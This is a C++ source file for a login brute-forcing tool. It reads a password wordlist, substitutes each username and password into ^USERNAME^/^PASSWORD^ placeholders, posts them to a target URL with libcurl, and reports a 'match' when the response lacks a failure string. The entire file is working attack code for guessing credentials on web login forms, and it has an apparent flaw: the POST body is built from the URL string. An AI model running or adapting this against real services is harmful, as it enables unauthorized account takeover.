#include "bruteforce.hpp"
#include <fstream>
#include <iostream>
#include <curl/curl.h>

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    size_t totalSize = size * nmemb;
    userp->append((char*)contents, totalSize);
    return totalSize;
}

void BruteForce::loadPasswords(const std::string &filename) {
    std::ifstream file(filename);
    std::string password;
    while (file >> password) {
        passwords.push_back(password);
    }
}

bool BruteForce::tryLogin(const std::string &url, const std::string &username, const std::string &password, const std::string &failureResponse) {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        std::string postFields = url;
        size_t usernamePos = postFields.find("^USERNAME^");
        size_t passwordPos = postFields.find("^PASSWORD^");
        
        if (usernamePos != std::string::npos) {
            postFields.replace(usernamePos, 10, username);
        }
        if (passwordPos != std::string::npos) {
            postFields.replace(passwordPos, 10, password);
        }

        std::cout << "Trying URL: " << url << std::endl;
        std::cout << "Post fields: " << postFields << std::endl;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());

        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);

        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            curl_easy_cleanup(curl);
            return false;
        }

        std::cout << "Received response: " << response << std::endl;

        if (response.find(failureResponse) == std::string::npos) {
            std::cout << "Match found! Username: " << username << ", Password: " << password << std::endl;
            curl_easy_cleanup(curl);
            return true;
        }

        curl_easy_cleanup(curl);
    }
    return false;
}
